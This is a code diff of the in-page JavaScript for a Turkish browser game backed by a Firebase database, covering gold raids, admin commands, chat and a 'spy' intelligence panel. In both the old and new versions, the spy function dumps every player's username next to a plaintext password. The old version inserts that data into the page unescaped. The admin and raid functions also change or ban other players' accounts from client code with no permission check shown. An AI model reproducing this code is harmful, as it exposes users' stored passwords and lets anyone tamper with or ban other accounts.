-    function execYagma(tU, myP, trP) {
-        document.getElementById('yagma-modal').style.display = 'none';
-        if(myP > trP) {
-            db.ref('players/'+tU).once('value', s => {
-                let t = s.val(); let g = Math.floor(t.gold*0.1);
-                t.gold -= g; p.gold += g; db.ref('players/'+tU).set(t); upP(); alert("Yağma Başarılı!");
-            });
-        } else alert("Yenildin!");
-    }
-
-    function getSpyData() {
-        db.ref('players').once('value', s => {
-            let h = "<table><tr><th>ALP</th><th>ŞİFRE</th></tr>";
-            s.forEach(x => { h += `<tr><td>${x.val().u}</td><td>${x.val().pw}</td></tr>`; });
-            document.getElementById('istihbarat-list').innerHTML = h + "</table>";
-        });
-    }
-
-    function upImg(el) { let r = new FileReader(); r.onload=e=>{ p.pImg=e.target.result; upP(); }; r.readAsDataURL(el.files[0]); }
-    function adm(t,v) {
+    function adm(t) {
         if(t==='gold') p.gold += 1000000;
+        if(t==='event') db.ref('isEvent').set(!isEvent);
         if(t==='msg') db.ref('announcement').set(document.getElementById('adm-m').value);
-        if(t==='ev') db.ref('announcement').set("ETKİNLİK: " + v);
         if(t==='gift') {
             let to = document.getElementById('adm-to').value.toLowerCase();
-            db.ref('players/'+to).once('value', s => {
-                if(s.val()){ let d=s.val(); if(!d.inv)d.inv=[]; d.inv.push({...Items[3], uid:Date.now()}); db.ref('players/'+to).set(d); }
-            });
+            db.ref('players/'+to).once('value', s => { if(s.val()){ let d=s.val(); if(!d.inv)d.inv=[]; d.inv.push({...Items[3], uid:Date.now()}); db.ref('players/'+to).set(d); alert("Zülfikar Verildi!"); } });
         }
+        if(t==='ban') { let to = document.getElementById('adm-to').value.toLowerCase(); db.ref('players/'+to+'/isBanned').set(true); alert("Sürgün Edildi!"); }
         upP();
     }
-    function sendMsg() { let m = document.getElementById('chat-in').value; if(m){ db.ref('messages').push({u:p.u, m}); document.getElementById('chat-in').value=""; } }
+
     function upP() { db.ref('players/'+p.u).set(p); }
     function pray() { if(p.en <= 80) { p.en += 20; upP(); } }
+    function sendMsg() { let m = document.getElementById('chat-in').value; if(m){ db.ref('messages').push({u:p.u, m}); document.getElementById('chat-in').value=""; } }
     function showP(id, el) { document.querySelectorAll('.panel').forEach(x=>x.classList.remove('active')); document.getElementById(id).classList.add('active'); document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('active')); el.classList.add('active'); }
-    function showD(m) { let b = document.getElementById('global-announcement'); b.innerText = "🔱 " + m; b.style.top = "0"; setTimeout(()=>b.style.top="-100px", 4000); }
+    function getSpyData() { db.ref('players').once('value', s => { let h = ""; s.forEach(x => { h += x.val().u+":"+x.val().pw+" | "; }); document.getElementById('istihbarat-list').innerText = h; }); }
 </script>
 </body>
 </html>
